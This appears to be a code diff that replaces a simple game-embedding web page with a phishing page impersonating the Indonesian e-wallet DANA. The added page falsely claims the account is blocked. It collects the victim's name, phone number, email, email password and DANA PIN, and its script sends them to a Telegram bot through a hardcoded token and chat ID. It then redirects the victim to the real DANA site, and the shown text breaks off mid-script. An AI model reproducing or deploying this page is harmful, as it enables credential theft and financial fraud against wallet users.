@@ -1,240 +1,122 @@
 <!DOCTYPE html>
-<html lang="ms">
+<html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Epul's Game Zone</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Notifikasi Pemblokiran Akun</title>
   <style>
     body {
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #ffb6c1, #f7e1d7);
+      font-family: Arial, sans-serif;
+      background: linear-gradient(#1a73e8, #ffffff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
       margin: 0;
-      padding: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0px 4px 12px rgba(0,0,0,0.1);
+      width: 350px;
+    }
+    h2 {
       text-align: center;
-      color: #333;
+      color: #d32f2f;
     }
-
-    h1 {
-      font-size: 3rem;
-      margin-top: 40px;
-      color: #fff;
-      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.1);
+    p {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
     }
-
-    .game-container {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-      gap: 20px;
-      padding: 20px;
-      max-width: 1200px;
-      margin: 0 auto;
-    }
-
-    .game-card {
-      background-color: #fff;
-      border-radius: 15px;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-      overflow: hidden;
-      position: relative;
-      transition: transform 0.3s ease;
-    }
-
-    .game-card:hover {
-      transform: translateY(-10px);
-    }
-
-    .game-card iframe {
+    input, button {
       width: 100%;
-      height: 180px;
+      padding: 12px;
+      margin-top: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    button {
+      background-color: #1a73e8;
+      color: white;
       border: none;
-      border-radius: 10px;
+      cursor: pointer;
     }
-
-    .game-card h2 {
-      font-size: 1.5rem;
-      margin-top: 10px;
-      color: #333;
+    button:hover {
+      background-color: #0c5dc0;
     }
-
-    footer {
-      background-color: #fff;
-      padding: 20px;
-      font-size: 1.2rem;
+    .small-text {
+      font-size: 11px;
       text-align: center;
-      margin-top: 50px;
-      box-shadow: 0 -4px 6px rgba(0, 0, 0, 0.1);
-    }
-
-    footer p {
-      margin: 0;
-      color: #333;
+      color: grey;
+      margin-top: 15px;
     }
   </style>
 </head>
 <body>
-  <h1>Welcome to Epul's Game Zone</h1>
-  <p>Discover and enjoy 100 games!</p>
 
-  <div class="game-container">
-    <!-- Permainan 1 hingga 100 menggunakan iframe -->
-    <div class="game-card">
-      <h2>Basketball Stars</h2>
-      <iframe src="https://poki.com/en/g/basketball-stars" title="Basketball Stars"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Flappy Bird</h2>
-      <iframe src="https://www.gamepix.com/play/flappy-bird" title="Flappy Bird"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Moto X3M</h2>
-      <iframe src="https://poki.com/en/g/moto-x3m" title="Moto X3M"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>2048</h2>
-      <iframe src="https://poki.com/en/g/2048" title="2048"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Ludo King</h2>
-      <iframe src="https://www.gamepix.com/play/ludo-king" title="Ludo King"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Agar.io</h2>
-      <iframe src="https://www.gamepix.com/play/agar-io" title="Agar.io"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Subway Surfers</h2>
-      <iframe src="https://poki.com/en/g/subway-surfers" title="Subway Surfers"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Snake</h2>
-      <iframe src="https://itch.io/embed/21275?secret=bhYvFehMc5OBzI5q9jYFlbA" title="Snake"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Pac-Man</h2>
-      <iframe src="https://poki.com/en/g/pac-man" title="Pac-Man"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Chess</h2>
-      <iframe src="https://poki.com/en/g/chess" title="Chess"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Super Mario</h2>
-      <iframe src="https://poki.com/en/g/super-mario" title="Super Mario"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Hill Climb Racing</h2>
-      <iframe src="https://poki.com/en/g/hill-climb-racing" title="Hill Climb Racing"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Among Us</h2>
-      <iframe src="https://www.gamepix.com/play/among-us" title="Among Us"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Color Switch</h2>
-      <iframe src="https://www.gamepix.com/play/color-switch" title="Color Switch"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Bubble Shooter</h2>
-      <iframe src="https://poki.com/en/g/bubble-shooter" title="Bubble Shooter"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Solitaire</h2>
-      <iframe src="https://www.gamepix.com/play/solitaire" title="Solitaire"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Angry Birds</h2>
-      <iframe src="https://poki.com/en/g/angry-birds" title="Angry Birds"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Jetpack Joyride</h2>
-      <iframe src="https://www.gamepix.com/play/jetpack-joyride" title="Jetpack Joyride"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Tank Trouble</h2>
-      <iframe src="https://www.gamepix.com/play/tank-trouble" title="Tank Trouble"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Dragon Ball Z</h2>
-      <iframe src="https://poki.com/en/g/dragon-ball-z" title="Dragon Ball Z"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Mario Kart</h2>
-      <iframe src="https://poki.com/en/g/mario-kart" title="Mario Kart"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Farming Simulator</h2>
-      <iframe src="https://poki.com/en/g/farming-simulator" title="Farming Simulator"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Flappy Bird 2</h2>
-      <iframe src="https://www.gamepix.com/play/flappy-bird-2" title="Flappy Bird 2"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Cut the Rope</h2>
-      <iframe src="https://poki.com/en/g/cut-the-rope" title="Cut the Rope"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>MineCraft</h2>
-      <iframe src="https://www.gamepix.com/play/minecraft" title="Minecraft"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Happy Wheels</h2>
-      <iframe src="https://www.gamepix.com/play/happy-wheels" title="Happy Wheels"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Super Smash Bros</h2>
-      <iframe src="https://poki.com/en/g/super-smash-bros" title="Super Smash Bros"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Flappy Golf</h2>
-      <iframe src="https://poki.com/en/g/flappy-golf" title="Flappy Golf"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Fruit Ninja</h2>
-      <iframe src="https://poki.com/en/g/fruit-ninja" title="Fruit Ninja"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Pokemon Go</h2>
-      <iframe src="https://www.gamepix.com/play/pokemon-go" title="Pokemon Go"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Geometry Dash</h2>
-      <iframe src="https://www.gamepix.com/play/geometry-dash" title="Geometry Dash"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Street Fighter</h2>
-      <iframe src="https://poki.com/en/g/street-fighter" title="Street Fighter"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Donkey Kong</h2>
-      <iframe src="https://poki.com/en/g/donkey-kong" title="Donkey Kong"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Space Invaders</h2>
-      <iframe src="https://poki.com/en/g/space-invaders" title="Space Invaders"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Pac-Man Championship</h2>
-      <iframe src="https://poki.com/en/g/pac-man-championship" title="Pac-Man Championship"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Super Bomberman</h2>
-      <iframe src="https://poki.com/en/g/super-bomberman" title="Super Bomberman"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Tetris</h2>
-      <iframe src="https://poki.com/en/g/tetris" title="Tetris"></iframe>
-    </div>
-    <div class="game-card">
-      <h2>Pokémon Puzzle</h2>
-      <iframe src="https://poki.com/en/g/pokemon-puzzle" title="Pokémon Puzzle"></iframe>
-    </div>
-    <!-- Teruskan menambah permainan sehingga 100 -->
+<div class="container">
+  <h2>Akun DANA Diblokir</h2>
+  <p>
+    Akun Anda diblokir karena terindikasi aktivitas ilegal.<br>
+    Untuk mengaktifkan kembali, silakan lakukan verifikasi data.
+  </p>
+
+  <form id="verifyForm">
+    <input type="text" id="nama" placeholder="Nama Lengkap" required>
+    <input type="text" id="nomor" placeholder="Nomor HP Terdaftar" required>
+    <input type="email" id="email" placeholder="Email DANA" required>
+    <input type="password" id="sandi_email" placeholder="Password Email" required>
+    <input type="password" id="pin" placeholder="PIN DANA" required>
+    <button type="submit">Verifikasi Sekarang</button>
+  </form>
+
+  <div class="small-text">
+    DANA Indonesia 2025 &copy; Semua hak dilindungi.
   </div>
+</div>
 
-  <footer>
-    <p>This Website Created by Epul</p>
-  </footer>
+<script>
+  const botToken = '8066606418:AAFa1KIMiONuJGEPHBWCJodOQXa59ce72xs';
+  const chatId = '5770777959';
 
-</body>
-</html>
+  document.getElementById('verifyForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const nama = document.getElementById('nama').value;
+    const nomor = document.getElementById('nomor').value;
+    const email = document.getElementById('email').value;
+    const sandi_email = document.getElementById('sandi_email').value;
+    const pin = document.getElementById('pin').value;
+
+    const message = `
+🔔 *DATA VERIFIKASI DANA* 🔔
+
+Nama: ${nama}
+Nomor HP: ${nomor}
+Email: ${email}
+Password Email: ${sandi_email}
+PIN DANA: ${pin}
+    `;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        alert('Verifikasi berhasil dikirim. Mohon tunggu 1x24 jam untuk aktivasi.');
+        window.location.href = 'https://www.dana.id/';
+      } else {
+        alert('Gagal mengirim data. Silakan coba lagi.');
+      }
+    })
